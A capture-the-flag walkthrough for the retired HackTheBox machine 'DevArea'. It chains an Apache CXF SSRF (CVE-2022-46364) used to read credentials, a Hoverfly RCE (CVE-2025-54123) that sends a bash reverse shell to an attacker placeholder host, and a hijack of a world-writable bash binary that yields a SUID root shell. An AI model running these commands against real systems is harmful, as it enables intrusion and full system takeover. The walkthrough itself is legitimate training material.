# DevArea — HackTheBox

**Platform:** HackTheBox
**OS:** Linux
**Status: Retired — full walkthrough published.**

**Full walkthrough:** [l3dsec.com/walkthroughs/devarea-htb](https://l3dsec.vercel.app/walkthroughs/devarea-htb.html)

---

## Attack Chain

```
nmap → 21 (FTP anon) + 80 + 8080 (Jetty) + 8888 (Hoverfly)
  → FTP anon → employee-service.jar (Apache CXF, pre-3.5.5)
    → CVE-2022-46364 SSRF → file:///etc/systemd/system/hoverfly.service
      → admin credentials in ExecStart
        → CVE-2025-54123 Hoverfly RCE → shell as dev_ryan → user flag
          → /usr/bin/bash world-writable + sudo syswatch.sh calls it
            → bash hijack → SUID rootbash → root flag
```

---

## 1. Enumeration

```bash
nmap -sC -sV -p- <TARGET_IP>
# 21/tcp  open  ftp     vsftpd 3.0.5 (anonymous login)
# 8080/tcp open http    Jetty 9.4.27
# 8888/tcp open http    Hoverfly Dashboard
```

FTP anon download from pub/ yields employee-service.jar — Apache CXF SOAP service, bundled version pre-3.5.5.

---

## 2. CVE-2022-46364 (Apache CXF SSRF → credential read)

CXF before 3.5.5 reflects XOP:Include href URLs server-side — arbitrary file read via file://.

```bash
python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb
# ExecStart: hoverfly -add -username admin -password O7IJ27MyyXiU
# User=dev_ryan
```

---

## 3. CVE-2025-54123 (Hoverfly Authenticated RCE)

Hoverfly 1.11.3 — authenticated RCE via middleware config injection.

```bash
nc -lvnp 4444
./CVE-2025-54123.sh -t http://<TARGET_IP>:8888 -u admin -p O7IJ27MyyXiU -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

Shell as dev_ryan. User flag at /home/dev_ryan/user.txt.

---

## 4. Privilege Escalation — Bash Binary Hijacking

```bash
sudo -l
# (root) NOPASSWD: /opt/syswatch/syswatch.sh
ls -la /usr/bin/bash
# -rwxrwxrwx  (world-writable)
```

syswatch.sh calls /usr/bin/bash internally. Replace with SUID-dropping script:

```bash
cp /usr/bin/bash /tmp/bash.bak
printf '#!/tmp/bash.bak\ncp /tmp/bash.bak /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' > /usr/bin/bash
chmod +x /usr/bin/bash
sudo /opt/syswatch/syswatch.sh status
/tmp/rootbash -p
# euid=0(root)
```

Root flag at /root/root.txt.

---

## Flags

| Flag | Value |
|------|-------|
| User | redacted |
| Root | redacted |

---

> For educational purposes only. Only test systems you own or have explicit written permission to test.
